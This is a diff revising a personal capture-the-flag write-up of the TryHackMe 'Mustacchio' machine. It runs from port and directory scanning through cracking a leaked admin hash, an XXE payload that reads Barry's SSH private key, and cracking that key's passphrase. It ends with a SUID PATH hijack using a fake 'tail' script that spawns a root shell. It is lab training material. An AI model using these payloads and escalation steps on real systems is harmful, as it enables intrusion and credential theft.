@@ -1,64 +1,153 @@
-Title: Mustacchio room
+Date: 03/11/2026
 
-  Date: 03/11/2026
-  Category: Reconnaissance, Vulnerability Analysis, Exploitation
+
+Category: Reconnaissance, Vulnerability Analysis, Exploitation, Privilege Escalation  
+
+
+Goal
+Gain root access on the Mustacchio machine (TryHackMe).  
   
   
-  Goal of the session:
-        Get root on mustacchio
+Initial Reconnaissance:
+        nmap -sV 10.113.146.201
+Port 22/tcp: OpenSSH 7.2p2 (Ubuntu)  
+Port 80/tcp: Apache httpd 2.4.18 (Ubuntu)
+
+> Note: No useful CVEs for either service. Manual enumeration of port 80 revealed no login forms, search functions, or interactive elements in page source.
+
+
+
+Directory brute-forcing and credential discovery:
+
+        gobuster dir -u http://[10.113.146.201] -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 10
+
+Discovered /custom/ directory.  
+Recursive scan of /custom/ revealed users.bak: 
+
+          <user>
+            <name>admin</name>
+            <password>1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</password>
+          </user>
+
+
+Cracked SHA-1 hash with Hashcat:  
+
+      echo "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" > hash.txt
+      hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
+      # Result: bulldog19
+
+
+Failed SSH login with admin:bulldog19
+
+
+Hidden service discovery and XXE exploitation:
+
+      nmap -p- --min-rate 1000 10.113.146.201
+
+
+Discovered port 8765/tcp (ultraseek-http).  
+Accessed http://10.113.146.201:8765 -> Admin login panel.  
+Page source revealed hint: <!-- Barry, you can now SSH in using your key! --> and cookie reference /auth/dontforget.bak.  
+Tested XML parsing by submitting troll text in comment block, reflected as plain text, confirming XXE vulnerability.
+
+
+XXE Payload to Extract SSH Key:
+
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
+      ]>
+      <comment>
+        <name>Joe Hamd</name>
+        <author>Barry Clad</author>
+        <com>&xxe;</com>
+      </comment>
+
+Response contained Barry’s encrypted RSA private key.
+
+Comment preview displays the private key content 
+instead of the submitted XML, confirming file read worked.
+
+
+SSH Key Cracking:
+
+      Save key to ~/Desktop/barry_key_final (via vim to preserve formatting)
+      chmod 600 ~/Desktop/barry_key_final
+      
+      Convert to John-compatible hash:
+      python3 /usr/share/john/ssh2john.py ~/Desktop/barry_key_final > barry_hash.txt
+      
+      Crack passphrase:
+      john --wordlist=/usr/share/wordlists/rockyou.txt barry_hash.txt
+       Result: urieljames
+
+
+SSH Login (Critical Fix):
+      
+      MUST use lowercase 'barry' (Linux usernames are case-sensitive)
+      ssh -i ~/Desktop/barry_key_final barry@10.113.146.201
+      Passphrase: urieljames
+
+
+
+
+Grabbing the User Flag:
+
+      ls -la
+      cat user.txt
+
+
+
+PPrivilege Escalation:
+
+Initial Checks:
+
+      sudo -l
+
+Failed, as this required a password not obtained yet. 
+
+
+SUID Binary Enumeration:
+
+      find / -perm -4000 -type f 2>/dev/null
+
+Result: A custom binary: /home/joe/live_log
+
+
+Binary Analysis: 
+
+      file /home/joe/live_log
+        Result: Compiled ELF binary
+      
+      strings /home/joe/live_log | grep -E "tail|cat|log|journal|sh|bash"
+        Result: 'tail' is called, lacking an absolute path.
+
+
+PATH hijack: 
+    
+      Create a malicious script named 'tail' in /tmp that spawns a shell
+        echo '#!/bin/bash' > /tmp/tail
+        echo '/bin/sh' >> /tmp/tail
+      
+      Make the script executable
+        chmod +x /tmp/tail
+      
+      Prepend /tmp to the PATH variable so it is searched first
+        export PATH=/tmp:$PATH
+      
+      Execute the SUID binary
+        /home/joe/live_log
+
   
-  
-  Commands used in session:
-        "nmap -sV 10.113.146.201"
 
-Nmap revealed 2 open ports. 22 ssh - OpenSSH 7.2p2. And 80 http - Apache httpd 2.4.18
+Result: Prompt change.
 
+whoami is expected to reveal ''root''.
 
 
-Page source reveals nothing to work with on the site related to port 80. 
-No CVE's to get any extra information on the http service.
-A few CVE's for the ssh version, but nothing to help get credentials.
+Grabbing the Root Flag:
 
-
-
-Manual enumeration reveals nothing of much use to progress. 1) No login, search etc directories to use. 2) No domains that reveal anything. 
-3) what can be clicked/interacted with reveal nothing in source view. 
-
-
-  Commands used in session:
-        "gobuster dir -u http://[10.113.146.201] -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 10"
-gobuster revealed a few directories. Some was already known. 
-One that stands out is "custom".
-
-          "gobuster dir -u http://10.113.146.201/custom/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 10"
-
-Scanning for any subdirs revealed a "users.bak" file.
-
-The users.bak file contained a name, admin, and hashcode, translating to bulldog19. Credentials do not work 
-on the SSH server.
-
-
-After seeing there were not any login directory pages I missed, I ran nmap again to check for any missed open ports.
-
-  Commands used in session:
-      "nmap -p- --min-rate 1000 10.113.146.201"
-
-This revealed port 8765, ultraseek-hhtp.
-
-Accessing this port revealed an admin login page, and viewing the page source, revealed a directory and name.
-
-      ""Example=/auth/dontforget.bak"
-
-The directory revealed an xml text. Using it to test whether or not the admin page parses such text, I went on to make
-an xml file to parse the .bak file, revealing a private SSH key. 
-
-The name revealed was Barry.
-
-Using ssh2john and john to crack the key enables us to get in as barry.
-
-A simple ls -la search would reveal that joe has a live_log. 
-
-A lack of a specified path on the command that joe is running was then used to perform a SUID path hijack to get root. 
+      cat /root/root.txt
 
 
 
@@ -67,6 +156,13 @@ A lack of a specified path on the command that joe is running was then used to p
 
 
 
+Key Takeaway:
+
+      Any custom SUID binary calling commands without absolute paths is highly vulnerable to $PATH manipulation
+
+
+
+      
 
 
 
